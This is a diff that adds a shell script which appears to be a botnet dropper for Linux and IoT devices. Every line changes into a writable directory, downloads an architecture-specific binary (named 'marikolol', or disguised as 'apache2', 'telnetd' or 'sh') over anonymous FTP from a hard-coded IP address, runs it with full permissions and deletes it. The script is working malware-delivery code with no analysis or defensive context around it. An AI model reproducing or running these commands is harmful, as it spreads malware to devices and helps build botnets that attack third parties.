@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololmips marikololmips; chmod 777 marikololmips ./marikololmips; rm -rf marikololmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololmipsel marikololmipsel; chmod 777 marikololmipsel ./marikololmipsel; rm -rf marikololmipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololsh4 marikololsh4; chmod 777 marikololsh4 ./marikololsh4; rm -rf marikololsh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololx86 marikololx86; chmod 777 marikololx86 ./marikololx86; rm -rf marikololx86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololarmv6l marikololarmv6l; chmod 777 marikololarmv6l ./marikololarmv6l; rm -rf marikololarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololi686 marikololi686; chmod 777 marikololi686 ./marikololi686; rm -rf marikololi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololppc marikololppc; chmod 777 marikololppc ./marikololppc; rm -rf marikololppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololi586 marikololi586; chmod 777 marikololi586 ./marikololi586; rm -rf marikololi586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 marikololm68k marikololm68k; chmod 777 marikololm68k ./marikololm68k; rm -rf marikololm68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 sh sh; chmod 777 sh ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 apache2 apache2; chmod 777 apache2 ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 76.74.219.170 telnetd telnetd; chmod 777 telnetd ./telnetd; rm -rf telnetd
